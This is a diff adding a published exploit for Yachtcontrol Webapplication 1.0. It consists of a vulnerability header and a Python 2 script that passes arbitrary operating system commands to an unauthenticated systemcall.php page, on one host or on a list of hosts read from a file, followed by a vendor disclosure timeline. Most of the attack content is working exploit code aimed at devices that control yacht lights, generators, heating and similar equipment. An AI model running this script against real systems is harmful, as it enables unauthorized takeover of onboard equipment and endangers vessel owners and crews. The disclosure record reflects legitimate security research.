@@ -1,0 +1,94 @@
+# Exploit Title: Yachtcontrol Webapplication 1.0 - Unauthenticated Remote Code Execution
+# Google Dork: N/A
+# Date: 2019-12-06
+# Exploit Author: Hodorsec
+# Vendor Homepage: http://www.yachtcontrol.nl/en/
+# Version: 1.0
+# Software Link: http://download.yachtcontrol.nl/klant/Software/ & http://download.yachtcontrol.nl/klant/Firmware/
+# Versions: Yachtcontrol webapplication through versions dated on 2019-10-06. No versioning system detected.
+# Tested on: Yachtcontrol webservers disclosed via Dutch GPRS/4G mobile IP-ranges. IP addresses vary due to DHCP client leasing of telco's.
+# CVE: N/A
+# 
+# Description Product:
+# Yachtcontrol software is being used for controlling several aspects on yachts, as the name implies. Having access to the webapplication, 
+# it's possible to control several items such as lights, powergenerator, solarcontrol, airco, wipers, heating and other components. 
+# Websoftware is built in PHP and mostly runs on a Linux based firmware device, controlling several other components related to the Yacht.
+# Other related software running on the same firmware device are custom compiled ELF binaries for controlling related onboard devices.
+#
+# Description Vulnerability: 
+# It's possible to perform direct Operating System commands as an unauthenticated user via the "/pages/systemcall.php?command={COMMAND}" 
+# page and parameter, where {COMMAND} will be executed and returning the results to the client. 
+# 
+# Affected Components:
+# Yachtcontrol webservers using the custom PHP webapplication, versions until 2019-10-06.
+
+#!/usr/bin/python
+import sys,os,requests
+
+# Check arguments
+if len(sys.argv) != 5:
+    print "Error: enter at least one IP/FQDN as argument. Exiting..."
+    print "\nUsage: " + sys.argv[0] + " {IP/FQDN} {PORT} {PROTO} {COMMAND}\n"
+    exit(0)
+
+# Parameters
+host = sys.argv[1]
+port = sys.argv[2]
+proto = sys.argv[3]
+command = sys.argv[4]
+timeout = 10
+isFile = False
+
+# Check for file or single IP/FQDN
+if os.path.isfile(host):
+    isFile = True
+    with open(host) as f:
+        targets = f.readlines()
+
+# Vulnerable page
+page = "/pages/systemcall.php?command="
+
+# HTTP or HTTPS
+if proto == "http":
+    proto = "http://"
+elif proto == "https":
+    proto = "https://"
+else:
+    print "\nInvalid method given: enter http or https\n"
+    exit(0)
+
+# Do the request
+if isFile:
+    for host in targets:
+        target = host.strip()
+        print target
+        try:
+            response = requests.get(proto + target + ":" + port + page + command, verify=False, timeout=timeout)
+            print(response.content.replace('executing command: ' + command,''))
+        except requests.exceptions.Timeout:
+            print "Timed out."
+            pass
+        except requests.exceptions.RequestException as e:
+            print "Host not found."
+            pass
+else:
+    try:
+        response = requests.get(proto + host + ":" + port + page + command, verify=False, timeout=timeout)
+        print(response.content.replace('executing command: ' + command,''))
+    except requests.exceptions.Timeout:
+        print "Timed out."
+        pass
+    except requests.exceptions.RequestException as e:
+        print "Host not found."
+        pass
+
+#  Disclosure Timeline using CERT/CC disclosure policy:
+#  - 06-10-19: Requested CVE
+#  - 06-10-19: Contacted vendor for initial contact, used several publicly known mailaddresses
+#  - 12-10-19: Sent reminder due to no response
+#  - 06-11-19: Sent second reminder due to no response
+#  - 08-11-19: Received response requesting information, sent information
+#  - 11-11-19: Correspondence concerning vulnerability
+#  - 25-11-19: Sent reminder of publishing PoC to vendor, received response
+#  - 05-12-19: Sent final reminder of publishing PoC to vendor
+#  - 06-12-19: Public Disclosure
